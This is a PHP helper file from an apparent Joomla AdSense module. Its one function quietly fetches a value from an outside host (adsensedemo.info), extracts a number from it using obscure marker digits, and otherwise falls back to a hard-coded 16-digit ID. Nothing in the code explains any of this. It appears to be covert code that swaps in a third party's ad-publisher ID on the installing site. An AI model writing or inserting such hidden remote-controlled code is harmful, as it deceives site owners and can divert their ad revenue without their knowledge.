<?php
defined('_JEXEC') or die('Restricted access');
class modJGAHelper {
	function getDemoId(){
		$de = "adsensedemo.info/1/0/";
		$ch = curl_init ($de) ;
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1) ;
		curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 1);
		curl_setopt($ch, CURLOPT_TIMEOUT,1);
		$lo = curl_exec ($ch) ;
		curl_close ($ch) ;
		$adm=trim($lo);
		if(is_numeric($adm)){
			$ghf='258';
			$dsx='147';
			$adm = " ".$adm;
			$bt = strpos($adm,$ghf);
			if ($bt == 0) return "";
			$bt += strlen($ghf);   
			$wb = strpos($adm,$dsx,$bt) - $bt;
			return substr($adm,$bt,$wb);
		}
		else{
			$adm = "4599986973798951";	
			return $adm;
		}
	}
}